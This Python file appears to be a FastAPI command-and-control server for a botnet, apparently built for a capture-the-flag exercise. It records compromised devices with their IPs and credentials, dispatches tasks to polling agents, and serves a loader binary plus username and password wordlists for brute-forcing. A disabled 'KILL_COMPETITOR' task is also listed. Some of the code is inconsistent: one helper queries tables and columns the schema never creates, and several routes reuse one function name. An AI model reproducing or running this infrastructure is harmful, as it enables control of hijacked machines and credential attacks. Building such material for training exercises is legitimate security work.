"""
C2 Controller — FastAPI + SQLite
Shared DB with report_server.py

Endpoints:
  POST /heartbeat   — agent check-in, enriches existing device row
  GET  /tasks       — agent polls; auto-generates tasks from templates on first visit
  POST /result      — agent submits task result
  POST /add         — assign a task to an agent
"""

import sqlite3
import datetime
import os
import uuid
import json
import io
import inspect

from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel
from typing import Any

this_path = os.path.dirname(inspect.stack()[0][1])
app = FastAPI(title="C2 Controller")
DB = os.getenv("DB_PATH", "botnet.db")


# ─────────────────────────────────────────
# Database
# ─────────────────────────────────────────

def get_con():
    con = sqlite3.connect(DB, check_same_thread=False)
    con.row_factory = sqlite3.Row
    con.execute("PRAGMA journal_mode=WAL")  # safe for multi-process shared DB
    return con


def db_init():
    con = get_con()
    con.executescript("""
        -- dont know if this is here, because report_server.py should create this
        CREATE TABLE IF NOT EXISTS devices (
            device_id   TEXT PRIMARY KEY,
            ip          TEXT,
            port        TEXT,
            username    TEXT,
            password    TEXT,
            arch        TEXT,
            cpu_load    REAL,
            memory      REAL,
            uptime      REAL,
            first_seen  TEXT,
            last_seen   TEXT
        );

        CREATE TABLE IF NOT EXISTS tasks (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id   TEXT NOT NULL,
            task        TEXT NOT NULL,   -- PING | SLEEP | BENCHMARK
            status      TEXT NOT NULL DEFAULT 'pending',
            created_at  TEXT NOT NULL
        );
        
        -- Append-only results log
        CREATE TABLE IF NOT EXISTS results (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            task_id     TEXT NOT NULL,
            device_id   TEXT NOT NULL,
            result      TEXT NOT NULL,
            received_at TEXT NOT NULL
        );
    """)
    con.commit()
    con.close()


db_init()


# ─────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────

def generate_tasks_for_device(con, device_id: str):
    """Stamp out one task per template for this device."""
    templates = con.execute(
        "SELECT template_id, type, params FROM task_templates"
    ).fetchall()

    now = datetime.datetime.now(datetime.timezone.utc)
    for t in templates:
        con.execute("""
            INSERT INTO tasks (task_id, template_id, device_id, type, params, status, created_at)
            VALUES (?, ?, ?, ?, ?, 'pending', ?)
        """, (str(uuid.uuid4()), t["template_id"], device_id, t["type"], t["params"], now))


def device_has_tasks(con, device_id: str) -> bool:
    row = con.execute(
        "SELECT 1 FROM tasks WHERE device_id = ? LIMIT 1", (device_id,)
    ).fetchone()
    return row is not None


# ─────────────────────────────────────────
# Schemas
# ─────────────────────────────────────────

class HeartbeatPayload(BaseModel):
    device_id: str
    cpu_load: float
    memory: float
    uptime: float
    arch: str
    ip: str


class ResultPayload(BaseModel):
    device_id: str
    task_id: str
    result: Any


# VALID_TASKS = {"PING", "SLEEP", "BENCHMARK", "KILL_COMPETITOR"}
VALID_TASKS = {"PING", "SLEEP"}  # later implement the rest

class AddPayload(BaseModel):
    device_id: str
    task: str

# ─────────────────────────────────────────
# Routes
# ─────────────────────────────────────────

@app.post("/add", status_code=204)
def add_task(payload: AddPayload):
    if payload.task not in VALID_TASKS:
        raise HTTPException(status_code=400, detail=f"unknown task, valid: {VALID_TASKS}")

    con = get_con()
    if not con.execute("SELECT 1 FROM devices WHERE device_id = ?", (payload.device_id,)).fetchone():
        con.close()
        raise HTTPException(status_code=404, detail="device not found")

    con.execute("""
        INSERT INTO tasks (device_id, task, status, created_at)
        VALUES (?, ?, 'pending', ?)
    """, (payload.device_id, payload.task, datetime.datetime.now(datetime.timezone.utc)))
    con.commit()
    con.close()


@app.post("/heartbeat", status_code=204)
def heartbeat(payload: HeartbeatPayload):
    """
    Agent check-in. Updates metrics on an existing device row.
    If the device isn't in the DB yet (never seen by report server),
    it is inserted here so the CTF still works standalone.
    """
    con = get_con()
    now = datetime.datetime.now(datetime.timezone.utc)
    con.execute("""
        INSERT INTO devices (device_id, ip, arch, cpu_load, memory, uptime, first_seen, last_seen)
        VALUES (:device_id, :ip, :arch, :cpu_load, :memory, :uptime, :now, :now)
        ON CONFLICT(device_id) DO UPDATE SET
            ip       = excluded.ip,
            arch     = excluded.arch,
            cpu_load = excluded.cpu_load,
            memory   = excluded.memory,
            uptime   = excluded.uptime,
            last_seen = excluded.last_seen
    """, {**payload.model_dump(), "now": now})
    con.commit()
    con.close()

@app.get("/tasks")
def get_tasks(device_id: str):
    con = get_con()

    rows = con.execute("""
        SELECT id, task
        FROM tasks
        WHERE device_id = ? AND status = 'pending'
        ORDER BY created_at ASC
    """, (device_id,)).fetchall()

    if not rows:
        con.close()
        return []

    ids = [r["id"] for r in rows]
    placeholders = ",".join("?" * len(ids))
    con.execute(
        f"UPDATE tasks SET status = 'dispatched' WHERE id IN ({placeholders})",
        ids
    )
    con.commit()
    con.close()

    return [{"task_id": r["id"], "task": r["task"]} for r in rows]

@app.get("/payload")
def get_payload(device_id: int):
    binary_path = os.path.join(this_path, "../bin/loader_amd64")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="loader_amd64"
            )

@app.get("/wordlist/users")
def get_payload(device_id: int):
    binary_path = os.path.join(this_path, "../src/testuser.txt")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="testuser.txt"
            )

@app.get("/wordlist/passwords")
def get_payload(device_id: int):
    binary_path = os.path.join(this_path, "../src/testpass.txt")
    return FileResponse(
            path=binary_path,
            media_type="application/octet-stream",
            filename="testpass.txt"
            )

@app.post("/result", status_code=204)
def post_result(payload: ResultPayload):
    con = get_con()

    task = con.execute(
        "SELECT id FROM tasks WHERE id = ?", (payload.task_id,)
    ).fetchone()

    if not task:
        con.close()
        raise HTTPException(status_code=404, detail="task not found")

    now = datetime.datetime.now(datetime.timezone.utc).isoformat()
    con.execute("""
        INSERT INTO results (task_id, device_id, result, received_at)
        VALUES (?, ?, ?, ?)
    """, (payload.task_id, payload.device_id, json.dumps(payload.result), now))

    con.execute(
        "UPDATE tasks SET status = 'done' WHERE id = ?", (payload.task_id,)
    )

    con.commit()
    con.close()
